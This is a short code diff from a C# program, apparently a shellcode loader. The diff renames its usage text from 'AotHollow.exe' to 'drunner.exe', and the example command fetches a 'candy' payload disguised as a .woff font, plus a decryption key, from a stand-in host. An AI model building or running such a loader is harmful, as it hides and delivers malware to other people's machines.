@@ -611,8 +611,8 @@ namespace Runner
         {
             if (args.Length != 2)
             {
-                Console.WriteLine("Usage: AotHollow.exe [candy url] [key url]");
-                Console.WriteLine("Example: AotHollow.exe https://myhost.com/sd.woff https://myhost.com/key.txt");
+                Console.WriteLine("Usage: drunner.exe [candy url] [key url]");
+                Console.WriteLine("Example: drunner.exe https://myhost.com/sd.woff https://myhost.com/key.txt");
                 return ;
             }
             
